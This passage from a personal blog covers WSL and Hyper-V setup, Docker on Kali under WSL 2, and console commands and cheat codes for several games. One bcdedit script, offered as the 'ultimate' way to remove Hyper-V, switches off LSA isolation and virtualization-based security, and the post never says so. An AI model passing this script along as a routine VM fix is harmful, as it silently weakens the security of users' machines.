<p>Refer to <a class="link"   href="https://docs.microsoft.com/en-us/windows/wsl/reference" >Command Reference for Windows Subsystem for Linux<i class="fas fa-external-link-alt"></i></a> for WSL commands.</p>
<p>Here let me review. Check the WSL version assigned to each of the Linux distributions installed</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; wsl --list --verbose <span class="comment"># wsl -l -v</span></span><br></pre></td></tr></table></figure>
<p>Set WSL 2&#x2F;1 as default, so the next distro will be version 2&#x2F;1 defaultly</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; wsl --set-default-version 2/1</span><br></pre></td></tr></table></figure>
<p>To set a distribution to be backed by either version of WSL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; wsl --set-version &lt;distribution name&gt; &lt;versionNumber&gt;</span><br><span class="line">&gt; wsl --set-version ubuntu 2</span><br></pre></td></tr></table></figure>
<p>Enter <code>wsl</code>&#x2F;<code>bash</code> to use default distro, enter <code>debian</code>&#x2F;<code>ubuntu</code>&#x2F;… to use other distros</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; wsl</span><br><span class="line">&gt; bash</span><br><span class="line">&gt; debian</span><br></pre></td></tr></table></figure>
<p>Learn more by showing help pages</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; wsl --<span class="built_in">help</span> <span class="comment"># wsl -h</span></span><br><span class="line">&gt; wslconfig <span class="comment"># wslconfig </span></span><br></pre></td></tr></table></figure>

<h2 id="Hyper-V"><a href="#Hyper-V" class="headerlink" title="Hyper-V"></a>Hyper-V</h2><p>It you are a multi-platform dev, or a normal user of vm, instead of an advanced windows developer, of a virtualization architect, you don’t need Hyper-v at all. Because without <code>VBoxGuestAdditions</code> or <code>VMwareTools</code>, VM in Hyper-v is like ppt playing.</p>
<p>Actually No.1 rival&#x2F;<del>competitor</del> of Hyper-v is VMware vSphere, and apparently in our using level, we can’t experience full potential of vitualizition tech, but in the future, maybe we will.</p>
<p>So my answer is NO, and be careful to try it cz after installing and uninstalling, VMs sometimes still disabled.</p>
<p>Uninstall Solutions:</p>
<ol>
<li><p>When canceled the check mark, sometimes VMs not work yet</p>
</li>
<li><p>Then open cmd as Administrator and input <code>bcdedit /set hypervisorlaunchtype off</code> and then check VMs</p>
</li>
<li><p>The ultimate solution is this script in cmd</p>
</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mountvol X: /s</span><br><span class="line"><span class="built_in">copy</span> %WINDIR%\System32\SecConfig.efi X:\EFI\Microsoft\Boot\SecConfig.efi /Y</span><br><span class="line">bcdedit /create &#123;<span class="number">0</span>cb3b571<span class="literal">-2f2e</span><span class="literal">-4343</span><span class="literal">-a879</span><span class="literal">-d86a476d7215</span>&#125; /d <span class="string">&quot;DebugTool&quot;</span> /application osloader</span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;<span class="number">0</span>cb3b571<span class="literal">-2f2e</span><span class="literal">-4343</span><span class="literal">-a879</span><span class="literal">-d86a476d7215</span>&#125; path <span class="string">&quot;\EFI\Microsoft\Boot\SecConfig.efi&quot;</span></span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;bootmgr&#125; bootsequence &#123;<span class="number">0</span>cb3b571<span class="literal">-2f2e</span><span class="literal">-4343</span><span class="literal">-a879</span><span class="literal">-d86a476d7215</span>&#125;</span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;<span class="number">0</span>cb3b571<span class="literal">-2f2e</span><span class="literal">-4343</span><span class="literal">-a879</span><span class="literal">-d86a476d7215</span>&#125; loadoptions <span class="built_in">DISABLE-LSA</span><span class="literal">-ISO</span>,<span class="built_in">DISABLE-VBS</span></span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;<span class="number">0</span>cb3b571<span class="literal">-2f2e</span><span class="literal">-4343</span><span class="literal">-a879</span><span class="literal">-d86a476d7215</span>&#125; device partition=X:</span><br><span class="line">bcdedit /<span class="built_in">set</span> hypervisorlaunchtype off</span><br><span class="line">mountvol X: /d</span><br></pre></td></tr></table></figure>

<p>After this you will find another EFI boot selection added. Actually both new and the old one is definitely ok to run VMs, so feel free to use EasyBCD to delete extra EFI boot selection.</p>
<h2 id="Windows-Sandbox"><a href="#Windows-Sandbox" class="headerlink" title="Windows Sandbox"></a>Windows Sandbox</h2><p>A similar hyper-v vm, but with slower bootup and an inactivated system (seriously???) and few apps in it.</p>
<p>So why not a hyper-v vm with snapshot? Why not vmware or vbox with snapshot?</p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The conclusion is : Try and even deeply use WSL 1 to develop but don’t use or even try WSL 2 &#x2F; Hyper-v<br>But your choice always depends on your own needs.</p>
<p>Consult <a class="link"   href="https://docs.microsoft.com/" >official documents<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://devblogs.microsoft.com/" >devblog<i class="fas fa-external-link-alt"></i></a> is always the right way to know and learn.<br>For developers click <a class="link"   href="https://developer.microsoft.com/" >here<i class="fas fa-external-link-alt"></i></a>, and Windows API references <a class="link"   href="https://msdn.microsoft.com/" >here<i class="fas fa-external-link-alt"></i></a>.</p>
<h2 id="Update-Tips"><a href="#Update-Tips" class="headerlink" title="Update (Tips)"></a>Update (Tips)</h2><p>Now it’s 2021&#x2F;9&#x2F;6 and I have changed my mind already. </p>
<p>I’m getting used to <code>WSL 2</code> due to convenience. It is a compact hyper-v vm and I can boot it up in several seconds. Though much slower (booting and file transfering betweene host and guest) than <code>WSL 1</code> but more powerful, it’s a relatively real linux vm.</p>
<p>Here is just for some Tips.</p>
<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>Since <code>Linux</code> has <code>docker</code> in repo, we can install it directly in <code>WSL 2</code> instead of installing <a href="https://www.docker.com/products/docker-desktop"><code>Docker Desktop for windows</code></a>.</p>
<p>But when using <code>kali</code>(<code>debian</code>) some error occurred. Install it by</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo apt install docker.io</span><br><span class="line">$ sudo apt install daemon   <span class="comment"># daemon is needed</span></span><br></pre></td></tr></table></figure>
<p>While when testing </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ dockerd   <span class="comment"># testing service</span></span><br><span class="line">[INFO] ...</span><br><span class="line">...</span><br><span class="line">[WARN] ...</span><br><span class="line">...</span><br><span class="line">[INFO] ...</span><br><span class="line"></span><br><span class="line">failed to start daemon: Error initializing network controller: error obtaining controller instance: unable to add <span class="built_in">return</span> rule <span class="keyword">in</span> DOCKER-ISOLATION-STAGE-1 chain:  (iptables failed: iptables --<span class="built_in">wait</span> -A DOCKER-ISOLATION-STAGE-1 -j RETURN: iptables v1.8.7 (nf_tables):  RULE_APPEND failed (No such file or directory): rule <span class="keyword">in</span> chain DOCKER-ISOLATION-STAGE-1</span><br><span class="line"> (<span class="built_in">exit</span> status 4))</span><br></pre></td></tr></table></figure>
<p>That is because <code>debian</code> based systems use <code>nftables</code> instead of <code>iptables</code>, that’s why the command failed.</p>
<p>To solve it, use <code>update-alternatives</code> to let <code>debian</code> use <code>iptables</code> rather than <code>nftables</code>. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo update-alternatives --set iptables /usr/sbin/iptables-legacy</span><br><span class="line"># for ipv6</span><br><span class="line">$ sudo update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy</span><br></pre></td></tr></table></figure>
<p>Then we can start service </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ service docker start</span><br><span class="line">$ service docker status</span><br></pre></td></tr></table></figure>
<p>After testing the <code>ubuntu</code> on <code>WSL 2</code> doesn’t have this problem, but lacking <code>docker</code> service installed.</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>docker</tag>
        <tag>linux</tag>
        <tag>wsl</tag>
        <tag>hyper-v</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Game Tips</title>
    <url>/2020/01/05/2020-01-05-Game-Tips/</url>
    <content><![CDATA[<p>Here are some tips of games.</p>
<h2 id="Red-Orchestra-2-Heroes-of-Stalingrad"><a href="#Red-Orchestra-2-Heroes-of-Stalingrad" class="headerlink" title="Red Orchestra 2: Heroes of Stalingrad"></a>Red Orchestra 2: Heroes of Stalingrad</h2><p>If you want to play sole mode (PVE)<br>Enter the game and press [~] to open the console and enter: <code>open gamemode-mapname</code> </p>
<h3 id="Game-Mode"><a href="#Game-Mode" class="headerlink" title="Game Mode"></a>Game Mode</h3><p>1 TE：Territory（attack &amp; defence）<br>2 FF：FireFighter（TeamDeath Match）<br>3 CD：Countdown（timed awd）</p>
<h3 id="Match-Map"><a href="#Match-Map" class="headerlink" title="Match Map"></a>Match Map</h3><p>Apartments<br>Barracks<br>CommissarsHouse<br>FallenFighters<br>GrainElevator<br>Gumrak<br>PavlovsHouse<br>RedOctoberFactory<br>Spartanovka<br>Station<br>…</p>
<h3 id="PvE-local"><a href="#PvE-local" class="headerlink" title="PvE (local)"></a>PvE (local)</h3><p>Type <code>open TE-Spartanovka</code> in console.<br>There are only one person player (you), and you can add bots to it.</p>
<h3 id="Add-Bots"><a href="#Add-Bots" class="headerlink" title="Add Bots"></a>Add Bots</h3><p>Let’s talk about how to load the robot BOT:</p>
<p>After entering the game, select your faction. After you get the gun steady, open the console and enter:<code>forceaddbots botsnumber camp</code></p>
<p>Soviet camp &#x3D; 1<br>German camp &#x3D; 2</p>
<p>for example:<br>The Soviets adds 2 soldiers, in console:<code>forceaddbots 2 1</code></p>
<p>The German adds 3 soldiers, in console:<code>forceaddbots 3 2</code></p>
<h2 id="Rising-Storm-2-Vietnam"><a href="#Rising-Storm-2-Vietnam" class="headerlink" title="Rising Storm 2: Vietnam"></a>Rising Storm 2: Vietnam</h2><p>To play single-player mode, after entering the game interface, press f3 to open the console.</p>
<h3 id="PvE-local-1"><a href="#PvE-local-1" class="headerlink" title="PvE (local)"></a>PvE (local)</h3><p>Enter <code>Open VNTE-CuChi?Minplayers=64?Maxplayers=64?Timelimit=1 200</code> to enter the map, and you will find plenty of bots there.</p>
<ul>
<li>VNTE-mapname (no spaces when entering the map name)</li>
<li>minplayers &#x3D; 64? maxplayers &#x3D; 64 (minimum and maximum)</li>
<li>timelimit &#x3D; 1 200 (1 is the number of rounds, 200 is the time)</li>
</ul>
<p>After entering the map, enter addbots 64 and join the bot</p>
<h3 id="Map-Set"><a href="#Map-Set" class="headerlink" title="Map Set"></a>Map Set</h3><p>VNTE-CuChi<br>VNTE-Hill937<br>VNTE-AnLaoValley<br>VNTE-SongBe<br>VNTE-HueCity<br>VNTE-LongTan<br>VNTE-RungSac<br>VNTE-OperationForrest<br>…</p>
<h2 id="DEAD-OR-ALIVE-5-Last-Round-Core-Fighters"><a href="#DEAD-OR-ALIVE-5-Last-Round-Core-Fighters" class="headerlink" title="DEAD OR ALIVE 5 Last Round: Core Fighters"></a>DEAD OR ALIVE 5 Last Round: Core Fighters</h2><p>Download and play the game.<br>Find the game in the library Right-click the game to open the game properties-&gt;test, enter <code>DOA5LROnlineBetaBranch</code>, then check the code and activate.</p>
<h2 id="Counter-Strike-Global-Offensive"><a href="#Counter-Strike-Global-Offensive" class="headerlink" title="Counter-Strike: Global Offensive"></a>Counter-Strike: Global Offensive</h2><p>Press key <code>~</code> to open command first.</p>
<h3 id="Cheat-Mode"><a href="#Cheat-Mode" class="headerlink" title="Cheat Mode"></a>Cheat Mode</h3><pre><code>sv_cheats 0/1                -- disable/enable cheat (needed by folowing part)
god                         -- god mode
sv_infinite_ammo 0/1/2      -- limited/unlimited bullet/unlimited magzines
sv_grenade_trajectory 0/1   -- show trace of the projectile
sv_grenade_trajectory_time 10  -- show 10s
sv_showimpacts 0/1          off/show impact point after shooting
sv_showimpacts_time 1       -- show 1s
toggle r_drawothermodels 1 2    -- try it
</code></pre>
<h3 id="Game-Setting"><a href="#Game-Setting" class="headerlink" title="Game Setting"></a>Game Setting</h3><p>Map settings like</p>
<pre><code>map de_dust2                -- enter/change map
fps_max 100                 
mp_restartgame 1        
mp_buyanywhere 1
mp_buytime 9999
mp_autoteambalance 0/1      -- off/on auto balance
mp_maxmoney 16000 
mp_startmoney 16000 
mp_freezetime 0
mp_roundtime_defuse 60      -- set round time
mp_limitteams 2             -- largest difference between the two sides is 2
maxplayers 10 
</code></pre>
<p>Bot Settings like</p>
<pre><code>bot_add 
bot_add_ct 
bot_add_t 
bot_kill 
bot_kick 
bot_freeze 0/1              -- freeze BOT
bot_knives_only BOT 
bot_pistols_only BOT 
bot_snipers_only BOT 
bot_all_weapons BOT 
bot_difficulty [0-3]        -- from lower to higher
bot_quota 10                -- add BOT 
bot_allow_pistols [0,1]     -- 1 is allowed, 2 is prohibited (the same below)
bot_allow_shotguns [0,1] 
bot_allow_sub_machine_guns [0,1] 
bot_allow_rifles [0,1] 
bot_allow_machine_guns [0,1] 
bot_allow_snipers [0,1] 
bot_allow_grenades [0,1] 
bot_allow_rogues [0,1] 
bot_place                   -- to place bot to where you point
noclip                      -- fly
</code></pre>
<p>Connection settings like</p>
<pre><code>connect x.x.x.x:xx;passwd
disconnect
retry
quit/exit
</code></pre>
<p>Commands about key binding</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind &quot;key&quot; &quot;func&quot;           -- set shortcut keys</span><br><span class="line"># e.g.</span><br><span class="line">bind &quot;t&quot; &quot;slot10&quot;           -- press &quot;t&quot; switch to Molotov cocktail</span><br><span class="line">bind &quot;kp_del&quot; &quot;buy flashbang&quot;   -- press &quot;del&quot; to buy flashbang</span><br></pre></td></tr></table></figure>

<h3 id="Display-Setting"><a href="#Display-Setting" class="headerlink" title="Display Setting"></a>Display Setting</h3><pre><code>net_graph 0/1               -- display fps/ping/loss/ticks
</code></pre>
<p>Or add boot option <code>-console -width 800 -height 600</code> to set resolution.</p>
<p>Or delete <code>steamapps</code> -&gt; <code>common</code> -&gt; <code>Counter-Strike Global Offensive</code> -&gt; <code>csgo</code> -&gt; <code>cfg</code> -&gt; <code>video.txt</code>, and enter game to reset.</p>
<h3 id="Boot-Options"><a href="#Boot-Options" class="headerlink" title="Boot Options:"></a>Boot Options:</h3><ul>
<li><p>add boot option<code>-perfectworld -language schinese</code> to enter perfect world server and display chinese.</p>
</li>
<li><p>add boot option<code>-tickrate 128</code> to enter 128 tick server.</p>
</li>
<li><p>after that, enter</p>
<ul>
<li>cl_cmdrate 128</li>
<li>cl_updaterate 128</li>
<li>rate 786432</li>
</ul>
</li>
</ul>
<h3 id="Config-file"><a href="#Config-file" class="headerlink" title="Config file"></a>Config file</h3><p>Commands can be saved in cfg file<br><img src="/imghost/gt/1.jpg" alt="bind"></p>
<p>As for cfg file, it is in <code>steamapp-&gt;common-&gt;Counter-Strike Global Offensivecsgo-&gt;cfg-&gt;xxx.cfg</code>.<br>Enter <code>exec xxx.cfg</code> in command to get it effect.<br>You can also add <code>-console +exec xxx</code> to boot option for convenience.</p>
<p>Share my training <code>cfg</code></p>
<ul>
<li><code>train_practice.cfg</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sv_cheats 1</span><br><span class="line">mp_restartgame 1</span><br><span class="line">mp_autoteambalance 0</span><br><span class="line">mp_buyanywhere 1</span><br><span class="line">mp_freezetime 0</span><br><span class="line">sv_infinite_ammo 2</span><br><span class="line">mp_limitteams 10</span><br><span class="line">mp_startmoney 99999</span><br><span class="line">mp_roundtime_defuse 60</span><br><span class="line">sv_grenade_trajectory 1</span><br><span class="line">sv_grenade_trajectory_time 15  </span><br><span class="line">sv_showimpacts 1 </span><br><span class="line">sv_showimpacts_time 3</span><br><span class="line">net_graph 1</span><br><span class="line">bot_stop</span><br><span class="line"></span><br><span class="line">bind &quot;alt&quot; &quot;noclip&quot;</span><br><span class="line">bind &quot;x&quot; &quot;toggle r_drawothermodels 1 2&quot;</span><br><span class="line">bind &quot;c&quot; &quot;bot_place&quot;</span><br></pre></td></tr></table></figure>
And</li>
</ul>
<ul>
<li><code>train_challenge.cfg</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bot_kick</span><br><span class="line">mp_autoteambalance 0</span><br><span class="line">mp_limitteams 100</span><br><span class="line">mp_restartgame 1</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">bot_add_t</span><br><span class="line">mp_restartgame 1</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Wallpaper-Engine"><a href="#Wallpaper-Engine" class="headerlink" title="Wallpaper Engine"></a>Wallpaper Engine</h2><p>&lt; Gear Button &gt; –&gt; &lt; About Tab &gt; –&gt; &lt;↑&gt;+&lt;↑&gt;+&lt;↓&gt;+&lt;↓&gt;+&lt;←&gt;+&lt;→&gt;+&lt;←&gt;+&lt;→&gt;+&lt; B &gt;+&lt; A &gt;+&lt; Enter &gt;<br>to unlock an achievement (and a new theme).</p>
<h2 id="Grand-Theft-Auto"><a href="#Grand-Theft-Auto" class="headerlink" title="Grand Theft Auto"></a>Grand Theft Auto</h2><p>Cheat Codes</p>
<h3 id="GTA-III"><a href="#GTA-III" class="headerlink" title="GTA III"></a>GTA III</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gunsgunsguns = get all weapons</span><br><span class="line">　　ifiwerearichman = get $250,000</span><br><span class="line">　　gesundheit = full healty</span><br><span class="line">　　morepoliceplease = wanted level +1</span><br><span class="line">　　nopoliceplease = 0 wanted level</span><br><span class="line">　　giveusatank = get tank</span><br><span class="line">　　bangbangbang = blow all cars in sight</span><br><span class="line">　　ilikedressingup = change clothes</span><br><span class="line">　　itsallgoingmaaad = people beat each other</span><br><span class="line">　　nobodylikesme = people beat u</span><br><span class="line">　　weaponsforall = people get weapons</span><br><span class="line">　　timeflieswhenyou = timer goes fast</span><br><span class="line">　　madweather = heavy rain</span><br><span class="line">　　boooooring = speed up the game</span><br><span class="line">　　turtoise = 100 armor</span><br><span class="line">　　skincancerforme = sunny </span><br><span class="line">　　ilikescotland = cloudy</span><br><span class="line">　　ilovescotland = rainy</span><br><span class="line">　　peasoup = foggy</span><br><span class="line">　　anicesetofwheels = only see wheels</span><br><span class="line">　　chittycittybb = cars fly</span><br><span class="line">　　cornerslikemad = improved car controlling</span><br><span class="line">　　nastylimbscheat = bloody mode</span><br></pre></td></tr></table></figure>
<h3 id="GTA-Vice-City"><a href="#GTA-Vice-City" class="headerlink" title="GTA Vice City"></a>GTA Vice City</h3><p>Weapons</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">THUGSTOOLS          --  badass arms</span><br><span class="line">PROFESSIONALTOOLS   --  military arms</span><br><span class="line">NUTTERTOOLS         --  other advanced arms</span><br></pre></td></tr></table></figure>
<p>Health</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PRECIOUSPROTECTION  --  full armor</span><br><span class="line">ASPIRINE            --  full blood/health</span><br></pre></td></tr></table></figure>
<p>Weather</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APLEASANTDAY        --  sunny</span><br><span class="line">ALOVELYDAY          --  good weather</span><br><span class="line">ABITDRIEG           --  cloudy</span><br><span class="line">CATSANDDOGS         --  rainy</span><br><span class="line">CANTSEEATHING       --  foggy</span><br></pre></td></tr></table></figure>
<p>Traffic and pedestrians</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BIGBANG             --  vehicle blows </span><br><span class="line">NOBODYLIKESME       --  all people beat u</span><br><span class="line">COMEFLYWITHME       --  cars float sometimes</span><br><span class="line">SEAWAYS             --  cars run on the water</span><br><span class="line">AIRSHIP             --  boats will float</span><br></pre></td></tr></table></figure>
<p>Cars</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AHAIRDRESSERSCAR    --  turn purple</span><br><span class="line">AHAIRDRESSERSCAR    --  turn black</span><br><span class="line">PANZER              --  tank</span><br><span class="line">THELASTRIDE         --  funeral car</span><br><span class="line">RUBBISHCAR          --  garbage truck</span><br><span class="line">GETTHEREFAST        --  fast car</span><br></pre></td></tr></table></figure>
<p>Clothes (Skin)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IDONTHAVETHEMONEYSONNY -- MAFIOSI</span><br><span class="line">FOXYLITTLETHING        -- MAFIOSI daughter</span><br><span class="line">LOOKLIKELANCE          -- LANCE</span><br><span class="line">MYSONISALAWYER         -- Lawyer</span><br></pre></td></tr></table></figure>
<p>Speed</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ONSPEED             --  speed up</span><br><span class="line">BOOOOOORING         --  slow down</span><br><span class="line">LIFEISPASSINGMEBY   --  timer speeds up</span><br></pre></td></tr></table></figure>
<h3 id="GTA-San-Andreas"><a href="#GTA-San-Andreas" class="headerlink" title="GTA San Andreas"></a>GTA San Andreas</h3><p>Control</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AJLOJYQY = Peds Attack Each Other, Get Golf Club </span><br><span class="line">BAGOWPG = Have a bounty on your head </span><br><span class="line">FOOOXFT = Everyone is armed </span><br><span class="line">BLUESUEDESHOES = Elvis is Everywhere </span><br><span class="line">BGLUAWML = Peds Attack You With Weapons, Rocket Launcher </span><br><span class="line">GOODBYECRUELWORLD = Suicide </span><br><span class="line">LIFESABEACH = Beach Party </span><br><span class="line">NINJATOWN = Ninja Theme </span><br><span class="line">BEKKNQV = Slut Magnet </span><br><span class="line">STATEOFEMERGENCY = Riot Mode </span><br><span class="line">CRAZYTOWN = Funhouse Theme </span><br><span class="line">SJMAHPE = Recruit Anyone (9mm) </span><br><span class="line">ROCKETMAYHEM = Recruit Anyone (Rockets) </span><br><span class="line">BMTPWHR = Country Vehicles and Peds, Get Born 2 Truck Outfit </span><br><span class="line">IOJUFZN = riot Mode</span><br><span class="line">PRIEBJ = fun house mode</span><br><span class="line">MUNASEF = slow motion mode</span><br><span class="line">FVTMNBZ = rural cars</span><br></pre></td></tr></table></figure>
<p>Protagonist status</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AEDUWNV = Never Get Hungry </span><br><span class="line">CVWKXAM = Infinite Oxygen </span><br><span class="line">ANOSEONGLASS = Adrenaline Mode </span><br><span class="line">KANGAROO = Mega Jump </span><br><span class="line">IAVENJQ = Mega Punch </span><br><span class="line">BTCDBCB = Fat </span><br><span class="line">KVGYZQK = Skinny </span><br><span class="line">HELLOLADIES = Max Sex Appeal </span><br><span class="line">BUFFMEUP = Max Muscle </span><br><span class="line">LXGIWYL = Weapon Set 1, Thug&#x27;s Tools </span><br><span class="line">KJKSZPJ = PROFESSIONALSKIT = Weapon Set 2</span><br><span class="line">UZUMYMW = Weapon Set 3, Nutter Tools </span><br><span class="line">BAGUVIX = Infinite Health </span><br><span class="line">HESOYAM = Health, Armor, $250k </span><br><span class="line">OUIQDMW = Full Weapon Aiming While Driving </span><br><span class="line">PROFESSIONALKILLER = Hitman In All Weapon Stats </span><br><span class="line">FULLCLIP = Infinite Ammo, No Reload </span><br><span class="line">AIYPWZQP = Have Parachute </span><br><span class="line">ROCKETMAN = Have Jetpack </span><br><span class="line">VKYPQCF = maximum endurance</span><br><span class="line">WORSHIPME = highest prestige</span><br><span class="line">NCSGDAG = all weapons proficiency reached the highest</span><br><span class="line">SZCMAWO = suicide</span><br></pre></td></tr></table></figure>
<p>Police and Gang</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ONLYHOMIESALLOWED = walkers become LS gangsters</span><br><span class="line">OSRBLHH = TURNUPTHEHEAT = Increase Wanted Level Two Stars </span><br><span class="line">ASNAEB = TURNDOWNTHEHEAT = Clear Wanted Level </span><br><span class="line">LJSPQK = BRINGITON = Six Star Wanted Level </span><br><span class="line">AEZAKMI = Never Wanted </span><br><span class="line">WORSHIPME = Max Respect </span><br><span class="line">ONLYHOMIESALLOWED = Gang Members Everywhere </span><br><span class="line">BIFBUZZ = Gangs Control the Streets </span><br></pre></td></tr></table></figure>
<p>Cars</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIWPRTON = Spawn Rhino </span><br><span class="line">CQZIJMB = Spawn Bloodring Banger </span><br><span class="line">JQNTDMH = Spawn Rancher </span><br><span class="line">VROCKPOKEY = Spawn Racecar </span><br><span class="line">VPJTQWV = Spawn Racecar </span><br><span class="line">WHERESTHEFUNERAL = Spawn Romero </span><br><span class="line">CELEBRITYSTATUS = Spawn Stretch</span><br><span class="line">TRUEGRIME = Spawn Trashmaster </span><br><span class="line">RZHSUEW = Spawn Caddy </span><br><span class="line">JUMPJET = Spawn Hydra </span><br><span class="line">KGGGDKP = Spawn Vortex Hovercraft </span><br><span class="line">OHDUDE = Spawn Hunter </span><br><span class="line">FOURWHEELFUN = Spawn Quad </span><br><span class="line">AMOMHRER = Spawn Tanker Truck </span><br><span class="line">ITSALLBULL = Spawn Dozer </span><br><span class="line">FLYINGTOSTUNT = Spawn Stunt Plane </span><br><span class="line">MONSTERMASH = Spawn Monster </span><br></pre></td></tr></table></figure>
<p>Vehicle control</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CPKTNWT = Blow Up All Cars </span><br><span class="line">WHEELSONLYPLEASE = Invisible car </span><br><span class="line">STICKLIKEGLUE = Perfect Handling</span><br><span class="line">ZEIIVG = All green lights </span><br><span class="line">YLTEICZ = Aggressive Drivers</span><br><span class="line">LLQPFBN = Pink traffic </span><br><span class="line">IOWDLAC = Black traffic</span><br><span class="line">FLYINGFISH = Boats fly </span><br><span class="line">EVERYONEISPOOR = Traffic is Cheap Cars</span><br><span class="line">EVERYONEISRICH = Traffic is Fast Cars</span><br><span class="line">RIPAZHA = Cars Fly </span><br><span class="line">CJPHONEHOME = Huge Bunny Hop</span><br><span class="line">JCNRUAD = Smash n&#x27; Boom </span><br><span class="line">SPEEDFREAK = All Cars Have Nitro </span><br><span class="line">BUBBLECARS = Cars Float Away When Hit </span><br><span class="line">GHOSTTOWN = Reduced Traffic </span><br><span class="line">FVTMNBZ = Traffic is Country Vehicles </span><br><span class="line">VKYPQCF = Taxis Have Nitrous, L3 Bunny Hop </span><br><span class="line">NATURALTALENT = Max All Vehicle Skill Stats </span><br></pre></td></tr></table></figure>
<p>Weather</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLEASANTLYWARM = Sunny Weather </span><br><span class="line">TOODAMNHOT = Very Sunny Weather </span><br><span class="line">ALNSFMZO = Overcast Weather </span><br><span class="line">AUIFRVQS = Rainy Weather </span><br><span class="line">CFVFGMJ = Foggy Weather </span><br><span class="line">SCOTTISHSUMMER = Thunderstorm</span><br><span class="line">CWJXUOC = Sandstorm </span><br><span class="line">OFVIAC = Orange Sky 21:00 </span><br></pre></td></tr></table></figure>
<p>Time</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YSOHNUL = Faster Clock </span><br><span class="line">SPEEDITUP = Faster Gameplay </span><br><span class="line">SLOWITDOWN = Slower Gameplay</span><br><span class="line">NIGHTPROWLER = Always Midnight </span><br></pre></td></tr></table></figure>
<h3 id="GTA-IV"><a href="#GTA-IV" class="headerlink" title="GTA IV"></a>GTA IV</h3><p>Use phone to dial.</p>
<h4 id="General"><a href="#General" class="headerlink" title="General"></a>General</h4><p>For GTA4 std &amp; TLAD &amp; TBoGT </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">948-555-0100 ZiT! (search singer and name of the song)</span><br><span class="line"></span><br><span class="line">482-555-0100 full health &amp; ammo</span><br><span class="line">362-555-0100 full health &amp; armor</span><br><span class="line">486-555-0100 weapon advanced suite</span><br><span class="line">486-555-0150 weapon poor suite</span><br><span class="line">267-555-0100 clear wanted level</span><br><span class="line">267-555-0150 increase wanted level</span><br><span class="line">468-555-0100 change weather</span><br></pre></td></tr></table></figure>
<p>Vehicle</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">359-555-0100 Annihilator </span><br><span class="line">938-555-0100 Jetmax </span><br><span class="line">625-555-0100 NRG-900</span><br><span class="line">625-555-0150 Sanchez</span><br><span class="line">227-555-0100 FIB Buffalo </span><br><span class="line">227-555-0175 Comet </span><br><span class="line">227-555-0147 Turismo</span><br><span class="line">227-555-0142 Cognoscenti </span><br><span class="line">227-555-0168 Super GT </span><br></pre></td></tr></table></figure>
<h4 id="TLAD-Only"><a href="#TLAD-Only" class="headerlink" title="TLAD Only"></a>TLAD Only</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">245-555-0100 Innovation </span><br><span class="line">245-555-0150 Hexer </span><br><span class="line">245-555-0199 Hakuchou Custom </span><br><span class="line">245-555-0125 Double T Custom </span><br><span class="line">826-555-0150 Gang Burrito </span><br><span class="line">826-555-0100 Slamvan </span><br></pre></td></tr></table></figure>
